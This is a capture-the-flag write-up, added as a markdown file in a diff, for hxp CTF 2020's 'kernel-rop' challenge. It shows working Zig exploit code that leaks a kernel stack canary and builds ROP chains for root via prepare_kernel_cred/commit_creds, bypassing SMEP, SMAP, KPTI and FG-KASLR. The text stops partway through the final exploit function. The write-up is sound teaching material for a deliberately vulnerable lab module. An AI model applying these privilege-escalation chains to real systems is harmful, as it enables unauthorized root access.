@@ -1,0 +1,1116 @@
+# kernel-rop (hxp CTF 2020)
+
+2025-07-25
+
+This challenge was my first experience with kernel pwn, and I’ve got to say it’s a pretty good introduction!
+
+## Description
+
+> Security is difficult, and defenses should be always taken with a grain of salt. Who would win? A buffer overflow or The Hottest Linux Defenses? Flag is in /dev/sda.
+
+### Files
+
+- [kernel-rop-bf9c106d45917343.tar.xz](https://2020.ctf.link/assets/files/kernel-rop-bf9c106d45917343.tar.xz)
+
+## Solution
+
+We’re given the kernel image `vmlinuz` and the `initramfs.cpio.gz`; let’s see what we’re working with:
+
+Bash
+
+``` bash
+extract-vmlinux vmlinuz > vmlinux
+file vmlinux
+```
+
+``` text
+vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), too many section (36140)
+```
+
+Bash
+
+``` bash
+mkdir -p initramfs; cd initramfs
+zcat ../initramfs.cpio.gz | cpio -id --quiet
+ls
+```
+
+``` text
+bin
+etc
+hackme.ko
+init
+root
+sbin
+usr
+```
+
+Bash
+
+``` bash
+pwn checksec ./initramfs/hackme.ko 2>&1
+```
+
+``` text
+[*] './initramfs/hackme.ko'
+    Arch:       amd64-64-little
+    RELRO:      No RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x0)
+    Stripped:   No
+    Debuginfo:  Yes
+```
+
+Let’s load `hackme.ko` into IDA:
+
+C
+
+``` c
+ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
+{
+  unsigned __int64 v4; // rdx
+  unsigned __int64 v5; // rbx
+  bool v6; // zf
+  ssize_t result; // rax
+  int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
+  unsigned __int64 v9; // [rsp+80h] [rbp-20h]
+
+  _fentry__(f, data);
+  v5 = v4;
+  v9 = __readgsqword(0x28u);
+  _memcpy(hackme_buf, tmp);
+  if ( v5 > 0x1000 )
+  {
+    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096, v5);
+    BUG();
+  }
+  _check_object_size(hackme_buf, v5, 1LL);
+  v6 = copy_to_user(data, hackme_buf, v5) == 0;
+  result = -14LL;
+  if ( v6 )
+    return v5;
+  return result;
+}
+
+ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
+{
+  unsigned __int64 v4; // rdx
+  ssize_t v5; // rbx
+  int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
+  unsigned __int64 v8; // [rsp+80h] [rbp-20h]
+
+  _fentry__(f, data, size, off);
+  v5 = v4;
+  v8 = __readgsqword(0x28u);
+  if ( v4 > 0x1000 )
+  {
+    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL);
+    BUG();
+  }
+  _check_object_size(hackme_buf, v4, 0LL);
+  if ( copy_from_user(hackme_buf, data, v5) )
+    return -14LL;
+  _memcpy(tmp, hackme_buf, v5);
+  return v5;
+}
+```
+
+Ok, a kernel module that will happily read​/​write in way more than it’s supposed to.
+
+Let’s check that we do indeed smash the stack:
+
+Zig
+
+``` zig
+const std = @import("std");
+
+pub fn main() !void {
+    const fd = try std.posix.open("/dev/hackme", .{ .ACCMODE = .RDWR }, 0o660);
+    defer std.posix.close(fd);
+
+    var buf: [40]u8 = undefined;
+    const bytes_read = try std.posix.read(fd, &buf);
+    std.debug.dumpHex(buf[0..bytes_read]);
+
+    _ = try std.posix.write(fd, "nil");
+}
+```
+
+``` text
+00007ffd2da7aa00  20 80 5F 07 80 88 FF FF  E0 0F 00 00 00 00 00 00   ._.............
+00007ffd2da7aa10  00 E6 F6 3F FF 6D FB F3  10 68 CA 06 80 88 FF FF  ...?.m...h......
+00007ffd2da7a9f0  68 FE 1B 00 00 C9 FF FF                           h.......
+[    1.539980] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: hackme_write+0xae/0xc0 [hackme]
+[    1.540395] CPU: 0 PID: 112 Comm: exploit Tainted: G           O      5.9.0-rc6+ #10
+[    1.540600] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.3-0-ga6ed6b701f0a-prebuilt.qemu.org 04/01/2014
+[    1.540865] Call Trace:
+[    1.541476]  dump_stack+0x74/0x92
+[    1.541560]  panic+0xfe/0x2e3
+[    1.541641]  ? hackme_write+0xae/0xc0 [hackme]
+[    1.541704]  __stack_chk_fail+0x14/0x20
+[    1.541757]  hackme_write+0xae/0xc0 [hackme]
+[    1.541840]  ? ksys_write+0xa7/0xe0
+[    1.541910]  ? exit_to_user_mode_prepare+0x31/0x180
+[    1.541975]  ? __x64_sys_write+0x1a/0x20
+[    1.542036]  ? do_syscall_64+0x37/0x80
+[    1.542111]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[    1.542666] Kernel Offset: disabled
+[    1.542945] Rebooting in 1 seconds..
+```
+
+Sanity check complete.
+
+Now let’s leak that pesky stack canary! According to IDA there’s nothing below int tmp\[32\] on the stack (besides the frame pointer), so the offset should be 4 \* 32 + 8.
+
+> **Pro tip:** You can debug kernel modules under GDB by adding the offset of a particular function or instruction to the base address of said module, which can be found in /proc/modules.
+
+Zig
+
+``` zig
+var buf: [4*32+8]u8 = undefined;
+_ = try std.posix.read(fd, &buf);
+std.mem.reverse(u8, buf[buf.len-8..]);
+std.debug.print("Stack canary is 0x{s}\n", .{std.fmt.bytesToHex(buf[buf.len-8..], .lower)});
+```
+
+``` text
+Stack canary is 0x1c55bfc54ff0b200
+```
+
+Let’s check if we can do a simple ret2win:
+
+Zig
+
+``` zig
+const tmp_size = @sizeOf(i32) * 32;
+
+fn bigEndianify(comptime len: usize, buf: []const u8) [len]u8 {
+    var bufLE: [len]u8 = undefined;
+    inline for (0..len) |i| bufLE[i] = buf[len-1-i];
+    return bufLE;
+}
+
+var __spinlock: bool = false;
+inline fn spin() void {
+    while (true) if (__spinlock) break;
+}
+
+
+fn leakCanary(fd: std.posix.fd_t) !u64 {
+    var buf: [tmp_size + 8]u8 = undefined;
+    _ = try std.posix.read(fd, &buf);
+
+    return std.mem.bytesAsValue(u64, buf[tmp_size..]).*;
+}
+
+fn ret2win() void {
+    // i don't understand why, but this doesn't work (for an unpriviledged shell)
+    // std.debug.print("[INFO] You won!!\n", .{});
+    // const argv = [_:null]?[*:0]const u8{"/usr/bin/whoami"};
+    // switch (std.posix.execveZ(argv[0].?, argv[0..argv.len], &[_:null]?[*:0]const u8{})) {
+    //     else => unreachable,
+    // }
+
+    asm volatile("int3; nop");
+}
+
+
+fn exploit(fd: std.posix.fd_t) !void {
+    const ret = std.mem.asBytes(&@intFromPtr(&ret2win));
+    std.debug.print("[INFO] Address of ret2win is 0x{s}\n", .{std.fmt.bytesToHex(bigEndianify(8, @constCast(ret)), .lower)});
+
+    const canary = try leakCanary(fd);
+    std.debug.print("[INFO] Stack canary is 0x{s}\n", .{std.fmt.bytesToHex(bigEndianify(8, @constCast(std.mem.asBytes(&canary))), .lower)});
+
+    const payload =
+        &[_]u8{0} ** tmp_size ++
+        std.mem.asBytes(&canary) ++
+        &[_]u8{0} ** (8 * 3) ++
+        ret;
+
+    _ = try std.posix.write(fd, payload);
+}
+```
+
+``` text
+[INFO] Address of ret2win is 0x00000000010251b0
+[INFO] Stack canary is 0x5d0897751cd5fe00
+[    2.480911] int3: 0000 [#1] SMP NOPTI
+[    2.480961] CPU: 0 PID: 112 Comm: exploit Tainted: G           O      5.9.0-rc6+ #10
+[    2.480966] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.3-0-ga6ed6b701f0a-prebuilt.qemu.org 04/01/2014
+[    2.480968] RIP: 0010:0x10251b1
+[    2.480970] Code: Bad RIP value.
+[    2.481005] RSP: 0018:ffffc900001bfeb0 EFLAGS: 00000296
+[    2.481028] RAX: 00000000000000a8 RBX: 0000000000000000 RCX: 0000000000000000
+[    2.481031] RDX: 0000000000000008 RSI: ffffffffc00024e0 RDI: ffffc900001bfea8
+[    2.481034] RBP: 0000000000000000 R08: 00000000010251b0 R09: 00000000010251b0
+[    2.481037] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
+[    2.481039] R13: ffffc900001bfef0 R14: 00007ffe920c3488 R15: ffff8880060c8600
+[    2.481042] FS:  0000000000000000(0000) GS:ffff888007800000(0000) knlGS:0000000000000000
+[    2.481045] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    2.481048] CR2: 000000000101fe20 CR3: 0000000006164000 CR4: 00000000000006f0
+[    2.481050] Call Trace:
+[    2.481052]  ? ksys_write+0xa7/0xe0
+[    2.481054]  ? exit_to_user_mode_prepare+0x31/0x180
+[    2.481056]  ? __x64_sys_write+0x1a/0x20
+[    2.481058]  ? do_syscall_64+0x37/0x80
+[    2.481061]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[    2.481063] Modules linked in: hackme(O)
+[    2.485064] ---[ end trace 32df1ad37c4c8194 ]---
+[    2.485072] RIP: 0010:0x10251b1
+[    2.485075] Code: Bad RIP value.
+[    2.485078] RSP: 0018:ffffc900001bfeb0 EFLAGS: 00000296
+[    2.485091] RAX: 00000000000000a8 RBX: 0000000000000000 RCX: 0000000000000000
+[    2.485093] RDX: 0000000000000008 RSI: ffffffffc00024e0 RDI: ffffc900001bfea8
+[    2.485096] RBP: 0000000000000000 R08: 00000000010251b0 R09: 00000000010251b0
+[    2.485098] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
+[    2.485101] R13: ffffc900001bfef0 R14: 00007ffe920c3488 R15: ffff8880060c8600
+[    2.485103] FS:  0000000000000000(0000) GS:ffff888007800000(0000) knlGS:0000000000000000
+[    2.485106] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    2.485108] CR2: 000000000101fe20 CR3: 0000000006164000 CR4: 00000000000006f0
+[    2.485111] Kernel panic - not syncing: Fatal exception in interrupt
+[    2.485661] Kernel Offset: disabled
+```
+
+Nice.
+
+### ret2usr
+
+For priviledge escalation, we’ll create a new set of root credentials with prepare_kernel_cred(NULL) and overwrite the process’s existing cred struct with commit_creds().^([1](#fn:1))
+
+Bash
+
+``` bash
+cat /proc/kallsyms | grep -e 'prepare_kernel_cred' -e 'commit_creds'
+```
+
+``` text
+ffffffff814c6410 T commit_creds
+ffffffff814c67f0 T prepare_kernel_cred
+ffffffff81f87d90 r __ksymtab_commit_creds
+ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred
+ffffffff81fa0972 r __kstrtab_commit_creds
+ffffffff81fa09b2 r __kstrtab_prepare_kernel_cred
+ffffffff81fa4d42 r __kstrtabns_commit_creds
+ffffffff81fa4d42 r __kstrtabns_prepare_kernel_cred
+```
+
+Additionally, we need to swap to userland before we pop a shell; this can be accomplished by saving the state of registers before interacting with the `hackme` driver, then calling swapgs​/​iretq to context switch back to userland.
+
+Zig
+
+``` zig
+export var user_cs: u64 = 0;
+export var user_ss: u64 = 0;
+export var user_rsp: u64 = 0;
+export var user_rflags: u64 = 0;
+
+fn saveState() callconv(.C) void {
+    asm volatile (
+      \\.intel_syntax noprefix
+      \\mov user_cs, cs
+      \\mov user_ss, ss
+	  \\mov user_rsp, rsp
+	  \\pushf
+	  \\pop qword ptr user_rflags
+      \\.att_syntax
+    );
+}
+
+fn escalate() callconv(.C) void {
+    asm volatile (
+      \\.intel_syntax noprefix
+      \\xor rdi, rdi
+      \\movabs rcx, 0xffffffff814c67f0
+	  \\call rcx
+
+      \\mov rdi, rax
+	  \\movabs rcx, 0xffffffff814c6410
+	  \\call rcx
+
+      \\swapgs
+      \\mov r15, user_ss
+      \\push r15
+      \\mov r15, user_rsp
+      \\push r15
+      \\mov r15, user_rflags
+      \\push r15
+      \\mov r15, user_cs
+      \\push r15
+      \\mov r15, user_rip
+      \\push r15
+      \\iretq
+      \\.att_syntax
+   );
+}
+```
+
+``` text
+whoami: unknown uid 1000
+[INFO] Saved state
+[INFO] Canary: 0x4876ab567c920000
+[INFO] You won!!
+whoami: unknown uid 0
+```
+
+### SMEP
+
+**Supervisor mode execution protection** is kinda like the NX bit: when we’re in the kernel, userland pages are marked as non-executable. So instead of just calling ret2win we have to use ROP to pop a shell.
+
+Bash
+
+``` bash
+ropr --range=0xffffffff81000000-0xffffffff81b00000 -R '^swapgs|^iretq|^pop rdi; ret|^mov rdi, rax; (mov|ret)' vmlinux
+```
+
+``` text
+0xffffffff81005245: mov rdi, rax; mov rdx, [rsp+8]; mov rax, [rsp]; add rsp, 0x18; jmp rdi;
+0xffffffff8100a557: swapgs; rdgsbase rax; swapgs; pop rbp; ret;
+0xffffffff8100a590: swapgs; wrgsbase rdi; swapgs; pop rbp; ret;
+0xffffffff81200000: swapgs; sysretq;
+0xffffffff812016d1: swapgs; sysret;
+0xffffffff8140867f: mov rdi, rax; mov rdx, rcx; shl rdx, 6; add rdx, rcx; mov byte ptr [rax+rdx*4+0x104], 0; call qword ptr [0xffffffff82040220];
+0xffffffff8146d4e4: swapgs; pop rbp; ret;
+0xffffffff815e8db8: pop rdi; ret 0x4100;
+0xffffffff81612872: mov rdi, rax; mov [rdx], r15; call qword ptr [0xffffffff82040220];
+0xffffffff816bf203: mov rdi, rax; mov [rsi+0x140], rdi; pop rbp; ret;
+0xffffffff816df01e: mov rdi, rax; mov [r15+0x50], edx; call qword ptr [0xffffffff82040220];
+0xffffffff8177020d: mov rdi, rax; mov rcx, [r10+0x148]; mov rdx, [r10+0x150]; call qword ptr [0xffffffff82040220];
+0xffffffff817aaccb: mov rdi, rax; mov [r8+0x98], rsi; mov [rbp-0x78], rdx; call qword ptr [0xffffffff82040220];
+0xffffffff818040d9: mov rdi, rax; mov rdx, [rdx+0x30]; mov r8, [rdx+0x40]; call qword ptr [0xffffffff82040220];
+0xffffffff818f8495: mov rdi, rax; mov qword ptr [rdi], 1; pop rbp; ret;
+0xffffffff8196258d: pop rdi; ret 0;
+0xffffffff819c67c7: iretq;
+0xffffffff819c6839: iretq;
+0xffffffff819c68f6: iretq;
+0xffffffff819ce301: pop rdi; ret 0xffff;
+0xffffffff81a68c0d: pop rdi; ret;
+0xffffffff81a77188: pop rdi; ret 0xb8ff;
+0xffffffff81adf905: iretq;
+```
+
+Through trial and error I determined that gadgets roughly past `0xffffffff81b00000` were in a non-executable segment, so I restricted the search to reflect that.
+
+Also, trying to use an allocator (including FixedBufferAllocator) to assist in constructing the payload led to confusing protection fault bugs, so beware of that.
+
+Zig
+
+``` zig
+const POP_RDI: u64 = 0xffffffff8196258d;
+const MOV_RDI_RAX_POP_RBP: u64 = 0xffffffff816bf203;
+const SWAPGS_POP_RBP: u64 = 0xffffffff8146d4e4;
+const IRETQ: u64 = 0xffffffff819c67c7;
+
+const PREPARE_KERNEL_CRED: u64 = 0xffffffff814c67f0;
+const COMMIT_CREDS: u64 = 0xffffffff814c6410;
+
+fn ropchain(writer: anytype) !void {
+    try writer.writeAll(std.mem.asBytes(&[_]u64{
+        POP_RDI,
+        0,
+        PREPARE_KERNEL_CRED,
+        MOV_RDI_RAX_POP_RBP,
+        0, // junk
+        COMMIT_CREDS,
+        SWAPGS_POP_RBP,
+        0, // junk
+        IRETQ,
+        user_rip,
+        user_cs,
+        user_rflags,
+        user_rsp,
+        user_ss,
+    }));
+}
+```
+
+``` text
+whoami: unknown uid 1000
+[INFO] Saved state
+[INFO] Canary: 0x9866a26a8b9ba300
+[INFO] You won!!
+whoami: unknown uid 0
+```
+
+#### SMAP
+
+With supervisor mode access protection we can not only not execute code in userspace, but not even read or write to it. Because our ROP chain is contained in kernelspace, we are able to escalate priviledges and context switch to userspace without reading from userland memory, so no issues here!
+
+``` text
+whoami: unknown uid 1000
+[INFO] Saved state
+[INFO] Canary: 0x9a56f4945c848500
+[INFO] You won!!
+whoami: unknown uid 0
+```
+
+([One possible solve](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#pivoting-the-stack) that works under SMEP but not SMAP involves stack pivoting to a page in userspace.)
+
+### KPTI
+
+**Kernel page-table isolation** is a mitigation that results in different page tables being used when in user-mode or kernel-mode, and it was introduced to combat the Meltdown attack.
+
+The previous exploit will not work because even though we context switch to userspace, we are still using kernel page tables and so ret2win is inaccessible. So in addition to context switching to userland, we also need to swap page tables.
+
+This can be accomplished by a *KPTI trampoline*, which is very similar to our context switching gadget except that it also modifies the `CR3` register to swap page tables.
+
+Bash
+
+``` bash
+cat /proc/kallsyms | grep -e 'swapgs_restore_regs_and_return_to_usermode'
+```
+
+``` text
+ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
+```
+
+Bash
+
+``` bash
+objdump --start-address=0xffffffff81200f26 --stop-address=0xffffffff81200f46 -S vmlinux
+objdump --start-address=0xffffffff81200f89 --stop-address=0xffffffff81200f97 -S vmlinux
+objdump --start-address=0xffffffff8146d4e0 --stop-address=0xffffffff8146d4e9 -S vmlinux
+objdump --start-address=0xffffffff81200f46 --stop-address=0xffffffff81200f4b -S vmlinux
+objdump --start-address=0xffffffff81201067 --stop-address=0xffffffff81201082 -S vmlinux
+objdump --start-address=0xffffffff81200fc7 --stop-address=0xffffffff81200fc9 -S vmlinux
+```
+
+``` text
+vmlinux:	file format elf64-x86-64
+
+Disassembly of section .text:
+
+ffffffff81000000 <_stext>:
+ffffffff81200f26: 48 89 e7             	movq	%rsp, %rdi
+ffffffff81200f29: 65 48 8b 24 25 04 60 00 00   	movq	%gs:0x6004, %rsp
+ffffffff81200f32: ff 77 30             	pushq	0x30(%rdi)
+ffffffff81200f35: ff 77 28             	pushq	0x28(%rdi)
+ffffffff81200f38: ff 77 20             	pushq	0x20(%rdi)
+ffffffff81200f3b: ff 77 18             	pushq	0x18(%rdi)
+ffffffff81200f3e: ff 77 10             	pushq	0x10(%rdi)
+ffffffff81200f41: ff 37                	pushq	(%rdi)
+ffffffff81200f43: 50                   	pushq	%rax
+ffffffff81200f44: eb 43                	jmp	0xffffffff81200f89 <_stext+0x200f89>
+
+ffffffff81000000 <_stext>:
+ffffffff81200f89: 58                   	popq	%rax
+ffffffff81200f8a: 5f                   	popq	%rdi
+ffffffff81200f8b: ff 15 f7 f0 e3 00    	callq	*0xe3f0f7(%rip)         # 0xffffffff82040088
+ffffffff81200f91: ff 25 e9 f0 e3 00    	jmpq	*0xe3f0e9(%rip)         # 0xffffffff82040080
+
+ffffffff8146d4e0 <.text.native_swapgs>:
+ffffffff8146d4e0: 55                   	pushq	%rbp
+ffffffff8146d4e1: 48 89 e5             	movq	%rsp, %rbp
+ffffffff8146d4e4: 0f 01 f8             	swapgs
+ffffffff8146d4e7: 5d                   	popq	%rbp
+ffffffff8146d4e8: c3                   	retq
+
+ffffffff81000000 <_stext>:
+ffffffff81200f46: 0f 20 df             	movq	%cr3, %rdi
+ffffffff81200f49: eb 34                	jmp	0xffffffff81200f7f <_stext+0x200f7f>
+
+ffffffff81000000 <_stext>:
+ffffffff81201067: 48 81 cf 00 10 00 00 	orq	$0x1000, %rdi           # imm = 0x1000
+ffffffff8120106e: 0f 22 df             	movq	%rdi, %cr3
+ffffffff81201071: 58                   	popq	%rax
+ffffffff81201072: ff 15 10 f0 e3 00    	callq	*0xe3f010(%rip)         # 0xffffffff82040088
+ffffffff81201078: 5f                   	popq	%rdi
+ffffffff81201079: 48 89 c4             	movq	%rax, %rsp
+ffffffff8120107c: 58                   	popq	%rax
+ffffffff8120107d: e9 45 ff ff ff       	jmp	0xffffffff81200fc7 <_stext+0x200fc7>
+
+ffffffff81000000 <_stext>:
+ffffffff81200fc7: 48 cf                	iretq
+```
+
+Zig
+
+``` zig
+const POP_RDI: u64 = 0xffffffff8196258d;
+const MOV_RDI_RAX_POP_RBP: u64 = 0xffffffff816bf203;
+const KPTI_TRAMPOLINE: u64 = 0xffffffff81200f26;
+
+const PREPARE_KERNEL_CRED: u64 = 0xffffffff814c67f0;
+const COMMIT_CREDS: u64 = 0xffffffff814c6410;
+
+fn ropchain(writer: anytype) !void {
+    try writer.writeAll(std.mem.asBytes(&[_]u64{
+        POP_RDI,
+        0,
+        PREPARE_KERNEL_CRED,
+        MOV_RDI_RAX_POP_RBP,
+        0, // junk
+        COMMIT_CREDS,
+        KPTI_TRAMPOLINE,
+        0, // junk
+        0, // junk
+        user_rip,
+        user_cs,
+        user_rflags,
+        user_rsp,
+        user_ss,
+    }));
+}
+```
+
+``` text
+whoami: unknown uid 1000
+[INFO] Saved state
+[INFO] Canary: 0xeabc83c7a6ad8500
+[INFO] You won!!
+whoami: unknown uid 0
+```
+
+#### Alternate solve: Signal Handlers
+
+The SMEP+SMAP solve will segfault in userland when KPTI is enabled; instead of using a KPTI trampoline to switch to userland page tables, we can register a signal handler (in userland) for `SIGSEGV` and the kernel will do the switch for us.
+
+Zig
+
+``` zig
+const std = @import("std");
+
+
+
+
+
+export var user_rip: u64 = undefined;
+fn ret2win(_: i32) callconv(.C) void {
+    std.debug.print("[INFO] You won!!\n", .{});
+
+    const args = [_:null]?[*:0]const u8{"/usr/bin/whoami"};
+    const env = [_:null]?[*:0]u8{};
+    switch (std.posix.execveZ("/usr/bin/whoami", args[0..args.len], env[0..env.len])) {
+        else => unreachable,
+    }
+}
+
+fn catch_sigsegv() void {
+    const sigact = std.posix.Sigaction{
+        .handler = .{ .handler = ret2win },
+        .mask = std.posix.empty_sigset,
+        .flags = 0,
+    };
+    std.posix.sigaction(std.posix.SIG.SEGV, &sigact, null);
+}
+
+pub fn main() !void {
+    catch_sigsegv();
+
+    user_rip = @intFromPtr(&ret2win);
+    saveState();
+    std.debug.print("[INFO] Saved state\n", .{});
+
+    const fd = try std.posix.open("/dev/hackme", .{ .ACCMODE = .RDWR }, 0o660);
+    defer std.posix.close(fd);
+
+    const canary = try leakCanary(fd);
+    std.debug.print("[INFO] Canary: 0x{s}\n", .{std.fmt.bytesToHex(bigEndianify(8, @constCast(std.mem.asBytes(&canary))), .lower)});
+
+    const file = (std.fs.File{ .handle = fd }).writer();
+    var bw = std.io.bufferedWriter(file);
+    const writer = bw.writer();
+
+    try writer.writeByteNTimes(0, tmp_size);
+    try writer.writeAll(std.mem.asBytes(&canary));
+    try writer.writeByteNTimes(0, (8*3));
+    try ropchain(writer);
+    try bw.flush();
+
+    unreachable;
+}
+```
+
+``` text
+whoami: unknown uid 1000
+[INFO] Saved state
+[INFO] Canary: 0x10f9df0cd1e27500
+[INFO] You won!!
+whoami: unknown uid 0
+```
+
+### KASLR
+
+Time for the final challenge: **fine-grained kernel address space layout randomization** (FG-KASLR).
+
+Unlike regular (K)ASLR, a single leak is not enough to find the addresses of all symbols—we must get more creative to find the addresses of certain parts of our payload.
+
+Fortunately not all symbols are affected by the fine-grained (or function granular?) part of KASLR:
+
+Bash
+
+``` bash
+cat /proc/kallsyms | grep -e 'startup_64' -e 'swapgs_restore_regs_and_return_to_usermode' -e 'prepare_kernel_cred' -e 'commit_creds'
+```
+
+``` text
+ffffffff95200000 T startup_64
+ffffffff95200030 T secondary_startup_64
+ffffffff952001f0 T __startup_64
+ffffffff95400f10 T swapgs_restore_regs_and_return_to_usermode
+ffffffff95987a80 T commit_creds
+ffffffff95b00e00 T prepare_kernel_cred
+ffffffff96187d90 r __ksymtab_commit_creds
+ffffffff9618d4fc r __ksymtab_prepare_kernel_cred
+ffffffff961a0972 r __kstrtab_commit_creds
+ffffffff961a09b2 r __kstrtab_prepare_kernel_cred
+ffffffff961a4d42 r __kstrtabns_prepare_kernel_cred
+ffffffff961a4d42 r __kstrtabns_commit_creds
+```
+
+Bash
+
+``` bash
+# reboot and run again
+cat /proc/kallsyms | grep -e 'startup_64' -e 'swapgs_restore_regs_and_return_to_usermode' -e 'prepare_kernel_cred' -e 'commit_creds'
+```
+
+``` text
+ffffffff90000000 T startup_64
+ffffffff90000030 T secondary_startup_64
+ffffffff900001f0 T __startup_64
+ffffffff90200f10 T swapgs_restore_regs_and_return_to_usermode
+ffffffff90741cf0 T commit_creds
+ffffffff908b7880 T prepare_kernel_cred
+ffffffff90f87d90 r __ksymtab_commit_creds
+ffffffff90f8d4fc r __ksymtab_prepare_kernel_cred
+ffffffff90fa0972 r __kstrtab_commit_creds
+ffffffff90fa09b2 r __kstrtab_prepare_kernel_cred
+ffffffff90fa4d42 r __kstrtabns_prepare_kernel_cred
+ffffffff90fa4d42 r __kstrtabns_commit_creds
+```
+
+Python
+
+``` python
+ksyms1 = {
+    0xffffffff95200000: "startup_64",
+    0xffffffff95200030: "secondary_startup_64",
+    0xffffffff952001f0: "__startup_64",
+    0xffffffff95400f10: "swapgs_restore_regs_and_return_to_usermode",
+    0xffffffff95987a80: "commit_creds",
+    0xffffffff95b00e00: "prepare_kernel_cred",
+    0xffffffff96187d90: "__ksymtab_commit_creds",
+    0xffffffff9618d4fc: "__ksymtab_prepare_kernel_cred",
+    0xffffffff961a0972: "__kstrtab_commit_creds",
+    0xffffffff961a09b2: "__kstrtab_prepare_kernel_cred",
+    0xffffffff961a4d42: "__kstrtabns_prepare_kernel_cred",
+    0xffffffff961a4d42: "__kstrtabns_commit_creds",
+}
+ksyms2 = {
+    0xffffffff90000000: "startup_64",
+    0xffffffff90000030: "secondary_startup_64",
+    0xffffffff900001f0: "__startup_64",
+    0xffffffff90200f10: "swapgs_restore_regs_and_return_to_usermode",
+    0xffffffff90741cf0: "commit_creds",
+    0xffffffff908b7880: "prepare_kernel_cred",
+    0xffffffff90f87d90: "__ksymtab_commit_creds",
+    0xffffffff90f8d4fc: "__ksymtab_prepare_kernel_cred",
+    0xffffffff90fa0972: "__kstrtab_commit_creds",
+    0xffffffff90fa09b2: "__kstrtab_prepare_kernel_cred",
+    0xffffffff90fa4d42: "__kstrtabns_prepare_kernel_cred",
+    0xffffffff90fa4d42: "__kstrtabns_commit_creds",
+}
+
+diff = 0
+invariants = []
+for ((addr1, sym), addr2) in zip(ksyms1.items(), ksyms2.keys()):
+    if sym == "startup_64":
+        diff = addr1-addr2
+    else:
+        if (addr1-addr2) == diff:
+            invariants.append(sym)
+
+print(f"{invariants} left invariant under FG-KASLR")
+```
+
+``` text
+['secondary_startup_64', '__startup_64', 'swapgs_restore_regs_and_return_to_usermode', '__ksymtab_commit_creds', '__ksymtab_prepare_kernel_cred', '__kstrtab_commit_creds', '__kstrtab_prepare_kernel_cred', '__kstrtabns_commit_creds'] left invariant under FG-KASLR
+```
+
+prepare_kernel_cred and commit_creds are affected by FG-KASLR, but the KPTI trampoline, \_\_ksymtab_commit_creds and \_\_ksymtab_prepare_kernel_cred are fine.
+
+What is \_\_ksymtab? There needs to be some way for kernel modules to be able to see symbols exported by the kernel or other kernel modules, so [ksymtab](https://elixir.bootlin.com/linux/v5.9-rc6/source/include/linux/export.h#L72-L76) is a struct (**which has an address that is a fixed offset from the kernel base address**) that stores information about a symbol, such as the address offset relative to the corresponding ksymtab struct.^([2](#fn:2)) So if we get the address of \_\_ksymtab_commit_creds and then add \_\_ksymtab_commit_creds.value_offset^([3](#fn:3)) to it, we get the address of commit_creds.
+
+With that in mind, let’s find gadgets to build our payload (restricting our search to the beginning of the kernel which, as we observed earlier, is not affected by FG-KASLR, just regular KASLR).
+
+Bash
+
+``` bash
+ropr --range=0xffffffff81000000-0xffffffff81400dc6 -R '^(pop rdi;|pop rax;|pop rbx;|pop rdx;|push rax;|mov eax, \[rax+.{3,5}\]; .*|add (r|e)ax, (r|e)di;) ret;' vmlinux
+```
+
+``` text
+0xffffffff81004aae: mov eax, [rax+0x10]; pop rbp; ret;
+0xffffffff81004d11: pop rax; ret;
+0xffffffff81006123: push rax; ret;
+0xffffffff810075d0: pop rbx; ret;
+0xffffffff81007616: pop rdx; ret;
+0xffffffff8100767c: pop rdi; ret;
+0xffffffff8100dad3: mov eax, [rax+0xe0]; pop rbp; shr eax, 1; and eax, 1; ret;
+0xffffffff81012551: add rax, rdi; ret;
+0xffffffff81012552: add eax, edi; ret;
+```
+
+I couldn’t find a way to move the result of prepare_kernel_cred(0) into `rdi` with the gadgets we have to work with, so I opted to split the payload into 2 pieces.
+
+Zig
+
+``` zig
+var POP_RDI: u64 = 0xffffffff8100767c;
+var POP_RAX: u64 = 0xffffffff81004d11;
+var POP_RBX: u64 = 0xffffffff810075d0;
+var POP_RDX: u64 = 0xffffffff81007616;
+var PUSH_RAX: u64 = 0xffffffff81006123;
+var MOV_EAX_ADDROF_RAX_PLUS_16_POP_RBP: u64 = 0xffffffff81004aae;
+var ADD_RAX_RDI: u64 = 0xffffffff81012551;
+var ADD_EAX_EDI: u64 = 0xffffffff81012552;
+
+var KPTI_TRAMPOLINE: u64 = 0xffffffff81200f26;
+var KSYMTAB_PREPARE_KERNEL_CRED: u64 = 0xffffffff81f8d4fc;
+var KSYMTAB_COMMIT_CREDS: u64 = 0xffffffff81f87d90;
+
+fn ropchain1(writer: anytype, fd: std.posix.fd_t, canary: u64) !void {
+    try writer.writeAll(std.mem.asBytes(&[_]u64{
+        POP_RAX,
+        KSYMTAB_PREPARE_KERNEL_CRED-0x10,
+        MOV_EAX_ADDROF_RAX_PLUS_16_POP_RBP,
+        0, // junk
+        POP_RDI,
+        KSYMTAB_PREPARE_KERNEL_CRED,
+        ADD_EAX_EDI,
+        POP_RDI,
+        (KSYMTAB_PREPARE_KERNEL_CRED >> 32) << 32,
+        ADD_RAX_RDI,
+        POP_RDI,
+        0,
+        PUSH_RAX,
+
+        POP_RBX,
+        @as(u64, @intCast(fd)),
+        POP_RDX,
+        canary,
+        KPTI_TRAMPOLINE,
+        0, // junk
+        0, // junk
+        @intFromPtr(&ret2ROP),
+        user_cs,
+        user_rflags,
+        user_rsp,
+        user_ss,
+    }));
+}
+
+fn ret2ROP() void {
+    const creds: u64 = asm volatile("" : [ret] "={rax}" (-> u64));
+    const fd: u64 = asm volatile("" : [fd] "={rbx}" (-> u64));
+    const canary: u64 = asm volatile("" : [canary] "={rdx}" (-> u64));
+
